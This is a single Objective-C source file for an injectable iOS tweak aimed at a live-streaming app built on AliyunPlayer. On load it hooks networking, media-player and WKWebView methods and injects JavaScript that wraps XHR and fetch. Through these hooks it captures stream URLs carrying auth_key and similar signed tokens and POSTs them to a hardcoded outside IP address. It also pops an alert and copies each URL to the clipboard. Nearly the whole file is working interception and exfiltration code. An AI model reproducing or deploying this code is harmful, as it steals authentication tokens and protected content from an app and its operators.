// DouNiuSniffer.m
// 单文件嗅探器（针对 douniu / AliyunPlayer 场景）
// 功能：抓 URL -> 优先带 auth_key -> 发 text/plain 到服务器 -> 弹窗并复制
//
// 编译说明（Theos / dylib 注入场景）
// - 推荐用 Logos (.xm) 或把此源码放到 Theos tweak 项目里。
// - 若不使用 Logos，请确保在 +load 中做 method swizzling。
// - 注入运行时会自动启动嗅探；要在 release 环境使用请先在测试机验证。

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import <AVFoundation/AVFoundation.h>
#import <WebKit/WebKit.h>

static NSString * const PUSH_ENDPOINT = @"http://139.155.57.242:8088/push"; // <-- 改成你的上报地址
static NSTimeInterval const DEDUPE_WINDOW = 60.0; // 秒，重复 URL 在此窗口内只处理一次

#pragma mark - helpers

static inline void dispatch_main_async(void (^blk)(void)) {
    if (blk == nil) return;
    if ([NSThread isMainThread]) blk();
    else dispatch_async(dispatch_get_main_queue(), blk);
}

static NSMutableDictionary<NSString*, NSDate*> *g_dedupe;
static dispatch_queue_t g_sniffer_queue;

static BOOL isLikelyStreamURL(NSString *u) {
    if (u.length == 0) return NO;
    NSString *s = [u lowercaseString];
    if ([s containsString:@".m3u8"] || [s containsString:@".flv"] || [s containsString:@"rtmp://"] || [s containsString:@"auth_key="]) return YES;
    // php 网关或含 play/stream 特征
    if ([s containsString:@"phonelive"] || [s containsString:@"pull.kuniunet"] || [s containsString:@"/live"] || [s containsString:@"replay"]) return YES;
    return NO;
}

static BOOL hasAuthKey(NSString *u) {
    if (!u) return NO;
    return ([[u lowercaseString] rangeOfString:@"auth_key="].location != NSNotFound) ||
           ([[u lowercaseString] rangeOfString:@"txsecret="].location != NSNotFound) ||
           ([[u lowercaseString] rangeOfString:@"txkey="].location != NSNotFound);
}

static BOOL dedupe_check_and_mark(NSString *u) {
    if (!u) return YES;
    __block BOOL shouldSkip = NO;
    dispatch_sync(g_sniffer_queue, ^{
        NSDate *last = g_dedupe[u];
        NSDate *now = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < DEDUPE_WINDOW) {
            shouldSkip = YES;
        } else {
            g_dedupe[u] = now;
            shouldSkip = NO;
        }
    });
    return shouldSkip;
}

static void copyToPasteboard(NSString *s) {
    if (!s) return;
    dispatch_main_async(^{
        UIPasteboard *pb = [UIPasteboard generalPasteboard];
        pb.string = s;
    });
}

static void showAlertWithURL(NSString *url, NSString *where) {
    if (!url) return;
    NSString *title = @"抓到直播源";
    NSString *msg = where ? [NSString stringWithFormat:@"%@\n%@", where, url] : url;
    dispatch_main_async(^{
        UIViewController *root = UIApplication.sharedApplication.keyWindow.rootViewController;
        while (root.presentedViewController) root = root.presentedViewController;
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
        [ac addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
            copyToPasteboard(url);
        }]];
        [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
        [root presentViewController:ac animated:YES completion:nil];
    });
}

static void postURLToServer(NSString *u, void (^completion)(BOOL ok)) {
    if (!u) { if (completion) completion(NO); return; }
    // 只发纯文本一行（text/plain）
    NSURL *url = [NSURL URLWithString:PUSH_ENDPOINT];
    if (!url) { if (completion) completion(NO); return; }
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    NSString *body = [u hasSuffix:@"\n"] ? u : [u stringByAppendingString:@"\n"];
    req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
    NSURLSessionDataTask *t = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        BOOL ok = (error == nil && [(NSHTTPURLResponse*)response statusCode] >= 200 && [(NSHTTPURLResponse*)response statusCode] < 300);
        if (completion) completion(ok);
    }];
    [t resume];
}

static void handleCapturedURL(NSString *u, NSString *where) {
    if (!u) return;
    if (!isLikelyStreamURL(u)) return;
    // 优先带 auth_key 的：如果有 auth_key 立即处理；否则也处理但可能延迟去重规则相同
    if (dedupe_check_and_mark(u)) {
        // 已处理过
        return;
    }
    // 若带 auth_key 则优先立即上报并弹窗
    if (hasAuthKey(u)) {
        postURLToServer(u, ^(BOOL ok) {
            // 弹窗 & 复制都在上报后进行（即使上报失败也弹窗）
            showAlertWithURL(u, where ?: @"捕获(带auth_key)");
            copyToPasteboard(u);
        });
        return;
    }
    // 非 auth_key 的也立即上报，但标记来源不同
    postURLToServer(u, ^(BOOL ok) {
        // 只弹窗一次（可根据需要改）
        showAlertWithURL(u, where ?: @"捕获");
        copyToPasteboard(u);
    });
}

#pragma mark - Swizzle utilities

static Method class_getInstanceMethodSafe(Class cls, SEL sel) {
    if (!cls) return NULL;
    return class_getInstanceMethod(cls, sel);
}

static BOOL swizzleInstanceMethod(Class cls, SEL origSel, SEL newSel) {
    Method orig = class_getInstanceMethodSafe(cls, origSel);
    Method newm = class_getInstanceMethodSafe(cls, newSel);
    if (!orig || !newm) return NO;
    method_exchangeImplementations(orig, newm);
    return YES;
}

static BOOL swizzleClassMethod(Class cls, SEL origSel, SEL newSel) {
    Class meta = object_getClass(cls);
    return swizzleInstanceMethod(meta, origSel, newSel);
}

#pragma mark - Hook implementations

// 1) NSURLSessionTask -resume (兜底抓请求)
@interface NSURLSessionTask (SnifferHook)
@end
@implementation NSURLSessionTask (SnifferHook)
- (void)sniffer_resume {
    @try {
        NSURLRequest *r = nil;
        if ([self respondsToSelector:@selector(currentRequest)]) {
            r = [self performSelector:@selector(currentRequest)];
        } else if ([self respondsToSelector:@selector(originalRequest)]) {
            r = [self performSelector:@selector(originalRequest)];
        }
        NSString *u = r.URL.absoluteString;
        if (u) {
            // 异步入队处理，避免阻塞网络线程
            dispatch_async(g_sniffer_queue, ^{
                handleCapturedURL(u, @"NSURLSessionTask");
            });
        }
    } @catch (NSException *e) {}
    // call original
    [self sniffer_resume];
}
@end

// 2) AVURLAsset +URLAssetWithURL:options:
@interface AVURLAsset (SnifferHook)
@end
@implementation AVURLAsset (SnifferHook)
+ (instancetype)sniffer_URLAssetWithURL:(NSURL *)URL options:(NSDictionary *)options {
    if (URL.absoluteString) {
        dispatch_async(g_sniffer_queue, ^{
            handleCapturedURL(URL.absoluteString, @"AVURLAsset");
        });
    }
    return [self sniffer_URLAssetWithURL:URL options:options];
}
@end

// 3) AVPlayerItem playerItemWithURL:
@interface AVPlayerItem (SnifferHook)
@end
@implementation AVPlayerItem (SnifferHook)
+ (instancetype)sniffer_playerItemWithURL:(NSURL *)URL {
    if (URL.absoluteString) {
        dispatch_async(g_sniffer_queue, ^{
            handleCapturedURL(URL.absoluteString, @"AVPlayerItem");
        });
    }
    return [self sniffer_playerItemWithURL:URL];
}
@end

// 4) WKWebView -loadRequest:
@interface WKWebView (SnifferHook)
@end
@implementation WKWebView (SnifferHook)
- (void)sniffer_loadRequest:(NSURLRequest *)request {
    if (request.URL.absoluteString) {
        dispatch_async(g_sniffer_queue, ^{
            handleCapturedURL(request.URL.absoluteString, @"WKWebView.loadRequest");
        });
    }
    // Also inject JS to capture H5-side dynamic assignment (if needed)
    @try {
        [self sniffer_loadRequest:request];
        // inject a small sniffer JS after load (best-effort)
        NSString *js = @"(function(){"
        "function sniff(u){ if(!u) return; window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.snifferHandler && window.webkit.messageHandlers.snifferHandler.postMessage(u); }"
        "var _open=XMLHttpRequest.prototype.open; XMLHTTPRequest.prototype&& (XMLHttpRequest.prototype.open=function(m,u){ try{ sniff(u);}catch(e){}; return _open.apply(this, arguments);});"
        "var oldFetch = window.fetch; window.fetch = function(){ try{ if(arguments && arguments[0]) sniff(arguments[0].toString()); }catch(e){}; return oldFetch.apply(this, arguments); };"
        "var _setsrc = HTMLMediaElement.prototype.__lookupSetter__('src'); if(_setsrc){ var old = HTMLMediaElement.prototype.__lookupSetter__('src'); HTMLMediaElement.prototype.__defineSetter__('src', function(v){ try{ sniff(v);}catch(e){}; if(old) old.call(this, v); }); }"
        "})();";
        // evaluate after a delay to avoid blocking
        dispatch_main_async(^{
            [self evaluateJavaScript:js completionHandler:nil];
        });
    } @catch (NSException *e) {}
}
@end

#pragma mark - AliyunPlayer specific hooks (best-effort names)
//
// The actual class names in the binary found earlier included: "AliPlayer" and "AVPUrlSource".
// We'll try to dynamically find these classes and swizzle common methods like -setUrl: and +urlWithString:
//

static void try_hook_aliyun_player() {
    Class clsAVPUrlSource = objc_getClass("AVPUrlSource");
    if (clsAVPUrlSource) {
        // class method +urlWithString:
        SEL origClassSel = sel_getUid("urlWithString:");
        SEL newClassSel = sel_getUid("sniffer_urlWithString:");
        Method orig = class_getClassMethod(clsAVPUrlSource, origClassSel);
        if (orig) {
            // add a category method implementation dynamically
            IMP imp = imp_implementationWithBlock(^id(id self, NSString *url) {
                if (url) {
                    dispatch_async(g_sniffer_queue, ^{
                        handleCapturedURL(url, @"AVPUrlSource.urlWithString");
                    });
                }
                // call original via objc_msgSend to +urlWithString: (we need to find original)
                // call original by fetching method and invoking
                typedef id (*Fn)(id, SEL, NSString*);
                Fn f = (Fn)method_getImplementation(orig);
                return f(self, origClassSel, url);
            });
            Method newm = class_getClassMethod(clsAVPUrlSource, origClassSel);
            // replace implementation
            method_setImplementation(orig, imp);
        }
        // instance -setUrl:
        SEL instSel = sel_getUid("setUrl:");
        Method minst = class_getInstanceMethod(clsAVPUrlSource, instSel);
        if (minst) {
            IMP imp2 = imp_implementationWithBlock(^(id _self, NSString *url) {
                if (url) {
                    dispatch_async(g_sniffer_queue, ^{
                        handleCapturedURL(url, @"AVPUrlSource.setUrl");
                    });
                }
                // call original
                typedef void (*Fn)(id, SEL, NSString*);
                Fn f = (Fn)method_getImplementation(minst);
                f(_self, instSel, url);
            });
            method_setImplementation(minst, imp2);
        }
    }

    Class clsAliPlayer = objc_getClass("AliPlayer");
    if (clsAliPlayer) {
        SEL setUrlSel = sel_getUid("setUrl:");
        Method mset = class_getInstanceMethod(clsAliPlayer, setUrlSel);
        if (mset) {
            IMP imp = imp_implementationWithBlock(^(id _self, NSString *url) {
                if (url) dispatch_async(g_sniffer_queue, ^{ handleCapturedURL(url, @"AliPlayer.setUrl"); });
                typedef void (*Fn)(id, SEL, NSString*);
                Fn f = (Fn)method_getImplementation(mset);
                f(_self, setUrlSel, url);
            });
            method_setImplementation(mset, imp);
        }
        // try setStsSource: setAuthSource: setMpsSource:
        NSArray *otherSels = @[@"setStsSource:", @"setAuthSource:", @"setMpsSource:"];
        for (NSString *selName in otherSels) {
            SEL s = sel_getUid(selName.UTF8String);
            Method mo = class_getInstanceMethod(clsAliPlayer, s);
            if (mo) {
                IMP imp2 = imp_implementationWithBlock(^(id _self, id src) {
                    // try extract url by KVC
                    @try {
                        NSString *url = nil;
                        if ([src respondsToSelector:@selector(valueForKey:)]) {
                            @try { url = [src valueForKey:@"url"]; } @catch(...) { }
                            if (!url) {
                                @try { url = [src valueForKey:@"playUrl"]; } @catch(...) { }
                            }
                        }
                        if (url) dispatch_async(g_sniffer_queue, ^{ handleCapturedURL(url, [NSString stringWithFormat:@"AliPlayer.%@", selName]); });
                    } @catch(...) {}
                    typedef void (*Fn)(id, SEL, id);
                    Fn f = (Fn)method_getImplementation(mo);
                    f(_self, s, src);
                });
                method_setImplementation(mo, imp2);
            }
        }
    }
}

#pragma mark - bootstrap

__attribute__((constructor))
static void sniffer_bootstrap() {
    g_dedupe = [NSMutableDictionary dictionary];
    g_sniffer_queue = dispatch_queue_create("com.douniu.sniffer", DISPATCH_QUEUE_SERIAL);

    // Swizzle NSURLSessionTask resume
    Class clsTask = objc_getClass("NSURLSessionTask");
    if (clsTask) {
        SEL orig = sel_getUid("resume");
        SEL newSel = sel_getUid("sniffer_resume");
        Method mnew = class_getInstanceMethod(objc_getClass("NSURLSessionTask"), newSel);
        // add method if not exist
        if (!mnew) {
            class_addMethod(objc_getClass("NSURLSessionTask"), newSel, (IMP)class_getMethodImplementation(objc_getClass("NSURLSessionTask"), orig), "v@:");
            // now swap
        }
        Method morig = class_getInstanceMethod(objc_getClass("NSURLSessionTask"), orig);
        Method mnew2 = class_getInstanceMethod(objc_getClass("NSURLSessionTask"), newSel);
        if (morig && mnew2) method_exchangeImplementations(morig, mnew2);
    }
    // Swizzle AVURLAsset +URLAssetWithURL:options:
    Class clsAVURLAsset = objc_getClass("AVURLAsset");
    if (clsAVURLAsset) {
        SEL orig = sel_getUid("URLAssetWithURL:options:");
        SEL newSel = sel_getUid("sniffer_URLAssetWithURL:options:");
        Method morig = class_getClassMethod(clsAVURLAsset, orig);
        Method mnew = class_getClassMethod(clsAVURLAsset, newSel);
        if (morig && mnew) method_exchangeImplementations(morig, mnew);
    }

    // Swizzle AVPlayerItem playerItemWithURL:
    Class clsAVPI = objc_getClass("AVPlayerItem");
    if (clsAVPI) {
        SEL orig = sel_getUid("playerItemWithURL:");
        SEL newSel = sel_getUid("sniffer_playerItemWithURL:");
        Method morig = class_getClassMethod(clsAVPI, orig);
        Method mnew = class_getClassMethod(clsAVPI, newSel);
        if (morig && mnew) method_exchangeImplementations(morig, mnew);
    }

    // Swizzle WKWebView -loadRequest:
    Class clsWK = objc_getClass("WKWebView");
    if (clsWK) {
        SEL orig = sel_getUid("loadRequest:");
        SEL newSel = sel_getUid("sniffer_loadRequest:");
        Method morig = class_getInstanceMethod(clsWK, orig);
        Method mnew = class_getInstanceMethod(clsWK, newSel);
        if (morig && mnew) method_exchangeImplementations(morig, mnew);
    }

    // Try hooking AliyunPlayer / AVPUrlSource if present
    try_hook_aliyun_player();

    // Register a tiny message handler for WKWebView JS postMessage if app has WKScriptMessageHandler;
    // For simplicity, we also add an observer for notifications in case JS posts via window.webkit.messageHandlers.snifferHandler.postMessage
    [[NSNotificationCenter defaultCenter] addObserverForName:@"DouNiuSniffer_JSMessage" object:nil queue:[NSOperationQueue mainQueue] usingBlock:^(NSNotification * _Nonnull note) {
        NSString *u = note.userInfo[@"url"];
        if (u) dispatch_async(g_sniffer_queue, ^{ handleCapturedURL(u, @"JSPost"); });
    }];
}

